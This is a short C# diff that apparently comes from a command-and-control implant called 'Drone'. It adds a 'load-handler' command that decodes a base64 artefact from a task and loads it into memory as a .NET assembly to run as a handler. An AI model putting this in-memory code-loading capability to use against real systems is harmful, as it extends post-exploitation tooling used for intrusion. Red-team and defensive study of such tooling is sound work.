@@ -30,6 +30,11 @@ namespace Drone.Modules
             {
                 new("/path/to/module.dll", false, true)
             }),
+            new Command("load-handler", "Load and start a new Drone Handler", LoadHandler, new List<Command.Argument>
+            {
+                new("/path/to/handler.dll", false, true),
+                new("args")
+            }),
             new Command("abort", "Abort a running task", AbortTask, new List<Command.Argument>
             {
                 new("task-guid", false)
@@ -290,6 +295,14 @@ namespace Drone.Modules
             
             Drone.LoadDroneModule(asm);
         }
+
+        private void LoadHandler(DroneTask task, CancellationToken token)
+        {
+            var bytes = Convert.FromBase64String(task.Artefact);
+            var asm = Assembly.Load(bytes);
+            
+            Drone.LoadDroneHandler(asm, task.Arguments);
+        } 
 
         private void AbortTask(DroneTask task, CancellationToken token)
         {
